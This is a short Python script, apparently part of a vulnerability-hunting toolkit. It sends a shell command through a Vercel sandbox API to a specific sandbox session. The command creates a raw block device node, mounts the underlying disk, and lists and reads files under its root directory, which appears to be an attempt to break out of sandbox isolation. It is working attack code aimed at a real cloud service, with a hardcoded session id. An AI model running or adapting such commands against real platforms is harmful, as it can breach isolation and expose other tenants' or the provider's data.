# -*- coding: utf-8 -*-
import sys, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

sid = 'sbx_DDreUVflOAXR4x4EzRfhAICXhLgO'
c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
           {"command": "sh", "args": ["-c", "mknod /dev/vda b 254 0 2>/dev/null; mkdir -p /mnt/vdax; mount /dev/vda /mnt/vdax 2>&1; cat /mnt/vdax/root/v48.out 2>&1; echo ===; ls -la /mnt/vdax/root/ 2>&1 | head -30"], "wait": True, "logs": True, "timeout": 30000}, timeout=60)
print('status:', c)
print(r[:5000])
